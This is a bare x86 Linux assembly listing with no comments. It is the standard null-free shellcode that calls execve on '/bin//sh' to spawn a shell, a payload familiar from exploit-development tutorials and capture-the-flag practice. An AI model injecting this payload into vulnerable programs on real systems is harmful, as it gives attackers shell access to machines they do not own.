section .text
	global _start

_start:
	xor eax, eax
	push eax

	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp

	push eax
	push ebx

	mov ecx, esp
	xor edx, edx

	mov al, 11
	int 80h
